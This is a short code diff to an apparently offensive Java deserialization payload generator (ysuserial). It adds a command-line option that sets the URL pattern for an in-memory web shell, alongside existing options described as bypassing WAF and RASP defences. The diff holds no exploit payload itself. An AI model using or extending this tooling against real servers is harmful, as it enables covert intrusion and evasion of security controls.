@@ -9,6 +9,7 @@ import org.su18.ysuserial.payloads.ObjectPayload.Utils;
 
 import static org.su18.ysuserial.payloads.config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
 import static org.su18.ysuserial.payloads.config.Config.IS_OBSCURE;
+import static org.su18.ysuserial.payloads.config.Config.URL_PATTERN;
 
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
@@ -32,6 +33,7 @@ public class GeneratePayload {
 		options.addOption("d", "dirty", true, "Using dirty data to bypass WAF");
 		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
 		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not");
+		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/su18]");
 
 		CommandLineParser parser = new DefaultParser();
 
@@ -54,6 +56,14 @@ public class GeneratePayload {
 
 		if (cmdLine.hasOption("obscure")) {
 			IS_OBSCURE = true;
+		}
+
+		if (cmdLine.hasOption("url")) {
+			String url = cmdLine.getOptionValue("url");
+			if (!url.startsWith("/")) {
+				url = "/" + url;
+			}
+			URL_PATTERN = url;
 		}
 
 		final String payloadType = cmdLine.getOptionValue("gadget");
